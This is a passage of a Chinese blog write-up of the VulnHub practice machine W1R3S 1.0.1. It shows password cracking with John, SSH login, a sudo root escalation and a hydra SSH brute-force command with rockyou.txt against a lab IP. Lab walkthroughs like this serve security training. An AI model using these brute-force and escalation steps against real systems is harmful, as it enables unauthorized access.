+<p><img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223220409601.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223220409601.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223220409601"></p>
+<p>直接丢给john爆破（不行的话在加复杂的参数）</p>
+<p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223221247509.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231223221247509.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231223221247509"></p>
+<p>一般来说www-data是功能性账号，w1r3s账号的权限高的可能性更大</p>
+<h5 id="试着用22端口的ssh服务登录，使用w1r3s的账号密码登录"><a href="#试着用22端口的ssh服务登录，使用w1r3s的账号密码登录" class="headerlink" title="试着用22端口的ssh服务登录，使用w1r3s的账号密码登录"></a>试着用22端口的ssh服务登录，使用w1r3s的账号密码登录</h5><h6 id="成功进入w1r3s用户的shell界面"><a href="#成功进入w1r3s用户的shell界面" class="headerlink" title="成功进入w1r3s用户的shell界面"></a>成功进入w1r3s用户的shell界面</h6><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224202715920.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224202715920.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231224202715920"></p>
+<h6 id="查看w1r3s用户的权限并尝试提权"><a href="#查看w1r3s用户的权限并尝试提权" class="headerlink" title="查看w1r3s用户的权限并尝试提权"></a>查看w1r3s用户的权限并尝试提权</h6><p>拥有sudo权限，且sudo -l有3个 ALL，意味着拥有所有的sudo权限（和root一样的权限），sudo &#x2F;bin&#x2F;bash到root用户</p>
+<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224203433956.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224203433956.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231224203433956" style="zoom: 80%;" /></h5><h6 id="root目录下发现flag-txt，整个攻击到此结束"><a href="#root目录下发现flag-txt，整个攻击到此结束" class="headerlink" title="&#x2F;root目录下发现flag.txt，整个攻击到此结束"></a>&#x2F;root目录下发现flag.txt，整个攻击到此结束</h6> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224204403915.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224204403915.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231224204403915" style="zoom:67%;" />
+
+<h3 id="补充：22端口的ssh暴力破解"><a href="#补充：22端口的ssh暴力破解" class="headerlink" title="补充：22端口的ssh暴力破解"></a>补充：22端口的ssh暴力破解</h3><p><strong>一般暴力破解优先级放在最后，其他方法行不通的时候再尝试，不推荐使用</strong></p>
+<h4 id="构造user-list字典，选择有可能的用户名（hector是之前ftp暴露的信息）"><a href="#构造user-list字典，选择有可能的用户名（hector是之前ftp暴露的信息）" class="headerlink" title="构造user.list字典，选择有可能的用户名（hector是之前ftp暴露的信息）"></a>构造user.list字典，选择有可能的用户名（hector是之前ftp暴露的信息）</h4><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224205440517.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224205440517.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231224205440517"></p>
+<h4 id="使用hydra进行爆破"><a href="#使用hydra进行爆破" class="headerlink" title="使用hydra进行爆破"></a>使用hydra进行爆破</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.list -P /usr/share/wordlists/rockyou.txt ssh://192.168.148.129 -t 4 </span><br></pre></td></tr></table></figure>
+
+<p><code>-L</code> 从列表中提取一个用户名</p>
+<p><code>-P</code> 指定密码字典</p>
+<p><code>-t</code> 指定爆破线程</p>
+<h4 id="爆破得到密码，之后的操作同上"><a href="#爆破得到密码，之后的操作同上" class="headerlink" title="爆破得到密码，之后的操作同上"></a>爆破得到密码，之后的操作同上</h4><p> <img src="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224210244518.png" class="lazyload" data-srcset="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/image-20231224210244518.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20231224210244518"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>首先进行nmap扫描出目标ip和端口信息，获取开放的服务，然后根据服务特点确定渗透的优先级，针对特定的服务搜索历史可利用的漏洞并尝试利用获取系统的shell，最后尝试提权获取系统的root权限</strong></p>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-12-24T21:31:49+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2023年12月24日</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://marmoz.github.io/2023/12/24/效率工具和设置之终端复用与界面移动/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hsuoamni的个人博客">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hsuoamni的个人博客">
-    <meta itemprop="description" content="卧薪尝胆中~">
-  </span>
+          
   
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2023/12/24/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7%E5%92%8C%E8%AE%BE%E7%BD%AE%E4%B9%8B%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8%E4%B8%8E%E7%95%8C%E9%9D%A2%E7%A7%BB%E5%8A%A8/"  itemprop="url">
-        效率工具和设置之终端复用与界面移动
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%B8%97%E9%80%8FWP/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>渗透WP</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>vulnhub靶机练习</p></a></div>
+  <span hidden itemprop="keywords">渗透WP vulnhub靶机练习</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
       
-        渗透原则用命令行，不用大型框架，用英文工具，用透明开源工具，不做个性设置，尽量不用鼠标
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://marmoz.github.io/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/&title=W1R3S 1.0.1靶机渗透 - Hsuoamni的个人博客&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://marmoz.github.io/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/&title=W1R3S 1.0.1靶机渗透 - Hsuoamni的个人博客&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://marmoz.github.io/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/&title=W1R3S 1.0.1靶机渗透 - Hsuoamni的个人博客&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2023/12/24/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7%E5%92%8C%E8%AE%BE%E7%BD%AE%E4%B9%8B%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8%E4%B8%8E%E7%95%8C%E9%9D%A2%E7%A7%BB%E5%8A%A8/'>
+          <p class='title'>效率工具和设置之终端复用与界面移动<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>渗透原则用命令行，不用大型框架，用英文工具，用透明开源工具，不做个性设置，尽量不用鼠标
 kali 好用工具curl 浏览器
 tcpdump 对标 wireshark
 base64
-一个工具完成一件事，少用大型框架，比如msf
-tmux简易教程tmux命令打开一个tmux会话
-ctrl+b 固定按键
-组合按键：
-固定+%：左右分屏
-固定+“：上下分屏
-固定+方向键：移动到指定窗口
-固定+[：复...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-          
-          <a class='avatar' href='/'><img src='https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg'></a>
-          <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-            <meta itemprop="image" content="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg">
-            <meta itemprop="name" content="Hsuoamni">
-            <meta itemprop="url" content="/">
-          </span>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-12-24T21:15:54+08:00">2023-12-24</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url"><span itemprop="name">渗透</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2023/12/24/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7%E5%92%8C%E8%AE%BE%E7%BD%AE%E4%B9%8B%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8%E4%B8%8E%E7%95%8C%E9%9D%A2%E7%A7%BB%E5%8A%A8/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
+一个工具完成一...</p>
+        </a>
       
     </div>
   
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://marmoz.github.io/2023/12/19/vol3使用说明/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hsuoamni的个人博客">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hsuoamni的个人博客">
-    <meta itemprop="description" content="卧薪尝胆中~">
-  </span>
   
-  
-  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2023/12/19/vol3%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"  itemprop="url">
-        Vol3使用说明
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        Vol3使用说明查看基本信息
-1python vol.py -f E:\game\2023ZKSS\检材3\memdump2023.raw -s E:\DianZiQuZheng\Volatility\volatility3python-2.5.0\volatility3-2.5.0\volatility3\symbols windows.info 
 
-能解析的直接一把梭
-不能解析的原因：在...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-          
-          <a class='avatar' href='/'><img src='https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg'></a>
-          <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-            <meta itemprop="image" content="https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg">
-            <meta itemprop="name" content="Hsuoamni">
-            <meta itemprop="url" content="/">
-          </span>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-12-19T20:50:32+08:00">2023-12-19</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">内存取证</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" itemprop="url"><span itemprop="name">内存取证</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2023/12/19/vol3%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
+    <div id="layoutHelper-comments"></div>
 
-</div>
+  </article>
 
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+
+
+
 
 
 </div>
@@ -2634,218 +2742,59 @@ ctrl+b 固定按键
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://somsom.oss-cn-hangzhou.aliyuncs.com/img/8a9f8dde87b22779b916ce531ca0cf19_1.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>Hsuoamni</h2>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hsuoamni的个人博客</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="mailto:1518687066@qq.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/Marmoz"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop pjax">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">
-
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" href="/categories/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"
-            active-action="action-categoriesE58685E5AD98E58F96E8AF81"
-            ><div class='name'>内存取证</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%B8%97%E9%80%8F/" href="/categories/%E6%B8%97%E9%80%8F/"
-            active-action="action-categoriesE6B897E9808F"
-            ><div class='name'>渗透</div><div class='badge'>(2)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile pjax">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">
-
-
-
-    <div class='content'>
-      <a href="/tags/Volatility3/" style="font-size: 14px; color: #999">Volatility3</a> <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" style="font-size: 14px; color: #999">vulnhub靶机练习</a> <a href="/tags/%E5%86%85%E5%AD%98/" style="font-size: 14px; color: #999">内存</a> <a href="/tags/%E6%B8%97%E9%80%8FWP/" style="font-size: 14px; color: #999">渗透WP</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" style="font-size: 14px; color: #999">渗透技巧</a>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget desktop pjax">
-  
-  <header>
-    
-      <i class="fa-solid fa-award fa-fw" aria-hidden="true"></i><span class='name'>站点信息</span>
-    
-  </header>
-
-<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">
-
-
-
-  <div class='content'>
-    <div class="webinfo">
-      
-        <div class="webinfo-item">
-          <div>文章数目：</div>
-          <div>3 篇</div>
-        </div>
-      
-
-      
-        <div class="webinfo-item">
-          <div>已运行时间：</div>
-          <div id="webinfo-runtime-count"></div>
-        </div>
-      
-
-
-      
-
-      
-        <div class="webinfo-item">
-          <div>本站访客数：</div>
-          
-          <div><span id="busuanzi_value_site_uv"><i class="fa-solid fa-fan fa-spin fa-fw" aria-hidden="true"></i></span> 人</div>
-          
-        </div>
-      
-
-      
-        <div class="webinfo-item">
-          <div>本站总访问量：</div>
-          
-          <div><span id="busuanzi_value_site_pv"><i class="fa-solid fa-fan fa-spin fa-fw" aria-hidden="true"></i></span> 次</div>
-          
-        </div>
-      
-
-      
-        <div class="webinfo-item">
-          <div>最后活动时间：</div>
-          <div id="last-update-show">2023-12-24 日</div>
-        </div>
-      
-    </div>
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-
-<section class="widget desktop mobile pjax">
-  
-  <header>
-    
-      <i class="fa-solid fa-clock WISTERIA fa-fw" aria-hidden="true"></i><span class='name'>最近更新</span>
-    
-  </header>
-
-<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">
-
-
-
-  <div class='content'>
-    <ul class="list entry navigation"><li><a class="widget-last" href="/2023/12/24/W1R3S%201.0.1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"><div class="item"><time>2023-12-24</time><span>渗透</span></div><span>W1R3S 1.0.1靶机渗透</span></a></li><li><a class="widget-last" href="/2023/12/24/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7%E5%92%8C%E8%AE%BE%E7%BD%AE%E4%B9%8B%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8%E4%B8%8E%E7%95%8C%E9%9D%A2%E7%A7%BB%E5%8A%A8/"><div class="item"><time>2023-12-24</time><span>渗透</span></div><span>效率工具和设置之终端复用与界面移动</span></a></li><li><a class="widget-last" href="/2023/12/19/vol3%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"><div class="item"><time>2023-12-20</time><span>内存取证</span></div><span>Vol3使用说明</span></a></li></ul>
-  </div>
-</section>
-
     
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-text">基本信息扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E7%A1%AE%E5%AE%9A%E7%BD%91%E6%AE%B5"><span class="toc-text">先确定网段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%95%B4%E4%B8%AAc%E6%AE%B5%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87ip"><span class="toc-text">扫描整个c段确定目标ip</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%EF%BC%9A%E7%99%BB%E5%BD%95%E6%99%AE%E9%80%9A%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%EF%BC%8C%E9%81%BF%E5%85%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%EF%BC%8C%E6%AF%8F%E6%AD%A5-sudo"><span class="toc-text">注：登录普通账户进行渗透，避免安全问题，每步+sudo</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87ip%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">扫描目标ip开放端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-text">详细信息扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%AB%AF%E5%8F%A3%E5%8F%B7%E5%88%B0-port%E5%8F%98%E9%87%8F"><span class="toc-text">提取端口号到$port变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%89%AB%E6%8F%8F"><span class="toc-text">编写扫描命令并扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%AB%E6%8F%8Ftcp"><span class="toc-text">扫描tcp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%AB%E6%8F%8Fudp%EF%BC%88%E6%89%AB%E6%8F%8F%E9%80%9F%E5%BA%A6%E5%BF%AB%EF%BC%89"><span class="toc-text">扫描udp（扫描速度快）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-text">默认漏洞脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E6%89%BE%E4%B8%8D%E5%88%B0%E6%94%BB%E5%87%BB%E8%BF%9E%E7%9A%84%E6%97%B6%E5%80%99%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%97%A0ipv6%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-text">当找不到攻击连的时候看看有无ipv6的地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="toc-text">渗透阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E7%9C%8B21%E7%AB%AF%E5%8F%A3%E7%9A%84ftp%E6%9C%8D%E5%8A%A1"><span class="toc-text">先看21端口的ftp服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%89%80%E6%9C%89%E7%9B%AE%E5%BD%95%E5%8F%8A%E5%AD%90%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%88binary%EF%BC%89%E5%90%8E%E9%80%80%E5%87%BAftp"><span class="toc-text">下载完所有目录及子目录下的文件（binary）后退出ftp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hash-indentifier%E8%AF%86%E5%88%AB%E4%B8%80%E4%B8%8B%E4%B8%8A%E9%9D%A2%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%BAmd5"><span class="toc-text">hash-indentifier识别一下上面的第一个字符串的加密算法为md5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cmd5%E9%87%8C%E6%9F%A5%E8%AF%A2md5%E5%80%BC%E5%A6%82%E4%B8%8B"><span class="toc-text">cmd5里查询md5值如下</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A6%82%E4%B8%8B"><span class="toc-text">base64解码一下第二个字符串如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%9A%94%E7%AC%A6%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%98%AFwires%E5%85%AC%E5%8F%B8%E5%91%98%E5%B7%A5%E5%88%97%E8%A1%A8%EF%BC%8C%E6%B3%A8%E6%84%8F%E4%B8%8D%E5%90%8C%E8%BA%AB%E4%BB%BD%E7%9A%84%E6%9D%83%E9%99%90%E7%89%B9%E7%82%B9"><span class="toc-text">分隔符下面的是wires公司员工列表，注意不同身份的权限特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%95%E4%B8%8B%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%94%A8%E5%9C%A8%E7%BA%BF%E9%80%86%E5%BA%8F%E5%92%8C%E6%88%AA%E5%9B%BE%E9%95%9C%E5%83%8F%E5%8A%9F%E8%83%BD%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AE%B9"><span class="toc-text">底下的字符串用在线逆序和截图镜像功能查看内容</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E7%9C%8B3306%E7%AB%AF%E5%8F%A3%E7%9A%84mysql%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%B8%BB%E6%9C%BAip%E9%99%90%E5%88%B6%EF%BC%8C%E6%94%BE%E5%BC%83"><span class="toc-text">再看3306端口的mysql服务，发现有主机ip限制，放弃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9C%8B80%E7%AB%AF%E5%8F%A3%E7%9A%84web%E6%9C%8D%E5%8A%A1"><span class="toc-text">最后看80端口的web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AEip%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AFapache%E9%BB%98%E8%AE%A4%E9%A1%B5%E9%9D%A2"><span class="toc-text">浏览器访问ip，发现是apache默认页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 